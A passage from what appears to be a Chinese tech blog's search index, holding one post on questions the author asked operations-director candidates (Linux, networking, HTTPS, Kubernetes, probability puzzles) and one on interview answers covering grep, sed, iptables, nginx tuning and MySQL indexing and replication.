    <content><![CDATA[缘起最近去北京出了一趟差，结果一去就被总部抓差到总部运维团队那里帮了两个星期（其实不止两个星期）的忙，说是帮忙其实算不上，应该说我是被抓丁参与了一个大的“项目”。


这个项目就是帮助梳理运维团队现在的为了 sla 和（成本）压降的方案，并参与帮他们招一个 leader，50+ 团队的 leader，一个运维总监。
这里我重点是说我参与面试运维总监的这个事儿，这么高 level 的岗位，拉我一工程师来参与面试，能聊什么呢？于是我非常自觉地把我的时间缩到 30 分钟之内，同时又在运维工作的一些方向上各找了几个简单基础的细节问题，打算试试这些大佬候选人的基础成色。
我的问题及效果Linux首先我聊的是 Linux 发行版，再聊 kernel 版本，这也不是每个人都聊的，要看其简历上是否有过 Linux 系统管理员的经验，到这里有人就已经毛了。
大家基本上都是红帽系：CentOS 用的比较多，但当我引出来红帽系（就说 CentOS 吧）的 kernel 版本不标准，他们把好多高版本的特性 backport 到老（低）版本。其实这个就有点流氓，Linux 主要是是指 kernel，结果你 CentOS 里 uname 看到的版本跟别的版本看到的不是一回事。关于这个事情，没有一个候选人意识到过。
进程管理孤儿进程和僵尸进程是什么？应该怎么处理？本想如果能聊，再问问 daemon 程序呢。结果，没有一个人能有机会让我扯出 daemon 的问题。
文件系统Linux 文件系统中的软链接和硬链接，有啥区别，占硬盘空间吗？结果是：大都知道软链接，也大致知道其特点，但对硬链接了解不多，对后面的问题自然也就不清楚了。
内存管理这个没问
网络rfc1918 中定义的 Private Address Space成想有张口就来的再问问 100.64 的事情的，结果，就这几个段的地址，没有一个候选人能准确无误的回答出来，当然，也还是有好几位只是也许是口误说 172.16.0.0-172.32. 而在我的提示下马上又更正了。这个问题我要求完全准确其实可能要求有点高，像那几位仅是 172.16. 那个段口误的，基本上来说可以得满分了。但我但凡说起 100.64. 这个段的事情，无人知晓
OSI 七层模型中的二层（链路层）、三层（网络层）、四层（传输层）、七层（应用层）分别是什么？有啥区别？有什么协议？这个问题相对答得好一点。
安全相关（或者说是应用）HTTPs几乎没有候选人知道客户端和服务器是怎么交互的，当然不知道也是正常的，当然我就诱导，HTTPs 是怎样保证安全（当然杠精这里可以怼我说 HTTPs 并不能保证安全）的呢？然后又说起对成加密和非对称加密，我问在 HTTPs 客户端和服务器的交互中用到了对称加密和非对称加密了吗？用到的话是哪里用到了？
结果：全军覆没。
可能是现在主流把安全团队从运维团队里划出去的后遗症吧。
数据库这个也没问，这个其实可以挑个简单的问题问下：比如说索引为什么会加快查询的速度什么的
公有云我准备问的问题是 AWS 里 VPC 中 public subnet 和 private subnet 的区别，这个也没普遍问，因为很多都没用过 AWS，而且，这个问题对于整个团队的大领导来说的确太琐碎太细了，如果没有做过基于 aws 的相关架构设计啥的具体工作的，的确都不一定知道。
kubernetes我想问的是暴露服务到集群外的方式，居然有很多人不知道，那我只能评价说他完全不懂 kubernetes，当然，也有人能完全答对的。
更有意思的是，有人能答出这几种方式，但当我追问 ingress 方式到底是怎样实现将服务暴露出去的呢？被我问住了，我感觉这典型就是不求甚解，学（kubernetes）的时候并没有带脑袋去想，而只是说我要背下来。
逻辑思维（概率相关）这种题我准备了两道：

已知函数 r64 会按百分之六十和百分之四十的概率返回整数 0 和 1，求函数 r55 使其按百分之五十和百分之五十的概率返回整数 0 和 1。
已知函数 r2，会按同样的概率返回整数 0 和 1，求函数 r3，使其按同样的概率返回整数 0、1 和 2

准确讲，这两个题都不难，难得是这样突然袭击候选人完全没准备可能会蒙，所以，我其实只是想知道大致的思路。结论：5 分钟之类没有人答对的，无论是第一题还是第二题。原本想第二题如果有人答得好再引申问下知道 rn，求 rm（n, m 都是正整数），但遗憾的是，没有人让我有机会聊这些……
]]></content>
      <tags>
        <tag>interview</tag>
        <tag>rfc1918</tag>
        <tag>tcp/ip</tag>
        <tag>孤儿进程</tag>
        <tag>僵尸进程</tag>
        <tag>运维总监</tag>
        <tag>面试题</tag>
      </tags>
  </entry>
  <entry>
    <title>面试之查漏补缺</title>
    <url>/2020/09/%E9%9D%A2%E8%AF%95%E7%9F%A5%E8%AF%86%E7%82%B9%E6%9F%A5%E6%BC%8F%E8%A1%A5%E7%BC%BA/index.html</url>
    <content><![CDATA[乍一看，题都不难，但手生了后好多不看 manual 都生写不出来。
没啥可说的，直接上问题。


找出文件中空行的行号答：用 grep 配合参数 -n 显示行号，具体命令：
grep -n &quot;^$&quot; file

把文件中所有的换行替换成空格sed答：用 sed 命令来把文件合成一行以后再替换，详见命令：
sed -e &#x27;1h;2,$H;$!d;g;s/\n/ /g&#x27; file

tr答：用 tr 命令替换 ‘\n’ 为 ‘ ‘，详见命令：
tr &#x27;\n&#x27; &#x27; &#x27; &lt; file | sed &#x27;s/ $/\n/&#x27;

查看状态是 established 的连接答：用 ss 命令：
ss -t state established

防火墙设置规则要求：

对所有地址开放本服务器的80端口、10~20端口。
其他机器可以用ping命令来探测本服务器的链接情况
其他没有被准许的端口将禁止访问

答：用 iptables，具体如下：
iptables -A INPUT -p tcp -m multiport --dports 10:20,80 -j ACCEPTiptables -A INPUT -p icmp --icmp-type echo-request -j ACCEPTiptables -A INPUT -j REJECT

Nginx 优化配置点work processesworker_processesNginx worker 的进程数，缺省为 1；推荐设为 auto，将实现每颗 cpu 核跑一个 worker 进程
worker_connections每个 worker 进程可以同时处理的最大连接数。
Keepalive Connectionskeepalive_requests客户端可以通过单个 keepalive 连接进行的请求数，可以酌情调大。
keepalive_timeout酌情调整
keepalive每个 worker 进程保持与上游服务器 keepalive 的空闲连接数，注意，要启用这个，需要同时配置如下设置：
proxy_http_version 1.1;proxy_set_header Connection &quot;&quot;;

sendfile操作系统的 sendfile（） 系统调用将数据从一个文件描述符复制到另一个文件描述符，通常实现零复制，这可以加快 TCP 数据传输的速度
caching启用缓存，您可以大大缩短对客户端的响应时间，同时可以大大减少后端服务器的负载
compression压缩发送给客户端的响应可以大大减小客户端的大小，因此它们使用较少的网络带宽。需要注意的是：启用压缩会消耗 CPU 资源，如果服务器的 CPU 资源是瓶颈的话慎用。还有，本来已经压缩过的内容（如图片）不要启用
MySQL 的联合索引联合索引又叫复合索引，是多个字段组成的一条索引。

联合索引的最左前缀匹配是指 where 条件一定要有联合索引的第一个字段
是否走联合索引跟 where 条件的顺序无关
遇到范围查询(&gt;、&lt;、between、like)就会停止匹配

MySQL 的主从复制（同步）先决条件：

master 上启用 binlog

原理：

master 上 binglog dump 线程将 binlog 的变化内容发给 slave
slave 上的 I&#x2F;O 线程收到 master 上发过来的 binlog 内容后，写入本地的 relay log
slave 上的 SQL 线程读取 relay log，并根据其内容回放到 slave

]]></content>
      <tags>
        <tag>MySQL</tag>
        <tag>ss</tag>
        <tag>sed</tag>
        <tag>nginx</tag>
        <tag>iptables</tag>
        <tag>tr</tag>
        <tag>grep</tag>
        <tag>联合索引</tag>
      </tags>
  </entry>
</search>
